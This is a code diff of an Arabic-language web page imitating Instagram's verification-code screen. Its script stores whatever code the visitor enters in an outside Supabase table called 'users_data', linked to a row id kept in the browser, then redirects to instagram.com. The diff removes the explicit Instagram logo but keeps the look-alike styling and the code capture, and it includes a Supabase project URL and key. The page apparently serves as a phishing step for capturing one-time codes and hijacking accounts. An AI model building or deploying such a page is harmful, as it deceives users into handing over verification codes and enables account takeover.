@@ -3,49 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تأكيد رمز التحقق • Instagram</title>
+  <title>تأكيد رمز التحقق</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: Arial, sans-serif;
       background-color: #fafafa;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      direction: rtl;
+      height: 100vh;
+      margin: 0;
     }
     .code-card {
       background: #ffffff;
       border: 1px solid #dbdbdb;
       padding: 30px;
-      width: 100%;
-      max-width: 350px;
+      width: 320px;
       text-align: center;
-      border-radius: 4px;
+      border-radius: 8px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-    }
-    .logo {
-      font-family: 'Grand Hotel', cursive, sans-serif;
-      font-size: 36px;
-      margin-bottom: 20px;
-      font-weight: normal;
-      color: #262626;
     }
     h2 {
       margin-bottom: 10px;
       color: #262626;
-      font-size: 18px;
     }
     p {
-      font-size: 13px;
+      font-size: 14px;
       color: #8e8e8e;
       margin-bottom: 20px;
-      line-height: 1.4;
     }
     input {
       width: 100%;
@@ -53,50 +38,41 @@
       margin: 8px 0;
       border: 1px solid #dbdbdb;
       border-radius: 4px;
+      box-sizing: border-box;
       background: #fafafa;
       text-align: center;
-      letter-spacing: 3px;
+      letter-spacing: 2px;
       font-size: 18px;
-      outline: none;
-    }
-    input:focus {
-      border-color: #a8a8a8;
     }
     button {
       width: 100%;
-      padding: 8px;
+      padding: 10px;
       background-color: #0095f6;
       color: white;
       border: none;
       border-radius: 4px;
-      font-weight: 600;
-      font-size: 14px;
+      font-weight: bold;
       cursor: pointer;
       margin-top: 10px;
     }
     button:disabled {
-      background-color: rgba(0, 149, 246, 0.3);
-      cursor: default;
+      background-color: #b2dffc;
     }
   </style>
-  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
-  <!-- مكتبة Supabase JS -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
   <div class="code-card">
-    <h1 class="logo">Instagram</h1>
     <h2>أدخل رمز التحقق</h2>
-    <p>أدخل الكود المكون من الأرقام الذي وصلك على بريدك الإلكتروني</p>
+    <p>أدخل الكود المكون من الأرقام الذي وصلك</p>
     <form id="codeForm">
-      <input type="text" id="code" placeholder="XXXXXX" required>
+      <input type="text" id="code" placeholder="أدخل الكود هنا" required>
       <button type="submit" id="submitBtn">Continuer</button>
     </form>
   </div>
 
   <script>
-    // إعداد الاتصال بـ Supabase
     const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
     const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -120,7 +96,6 @@
       submitBtn.innerText = 'جاري الحفظ...';
 
       try {
-        // تحديث السطر السابق بفرز الكود
         const { error } = await supabaseClient
           .from('users_data')
           .update({ code: codeValue })
@@ -133,8 +108,8 @@
           submitBtn.innerText = 'Continuer';
         } else {
           alert('تم التأكيد بنجاح!');
-          localStorage.removeItem('user_row_id'); // مسح الـ ID بعد الانتهاء
-          window.location.href = 'https://instagram.com'; // إعادة التوجيه
+          localStorage.removeItem('user_row_id');
+          window.location.href = 'https://instagram.com';
         }
       } catch (err) {
         console.error('Unexpected error:', err);
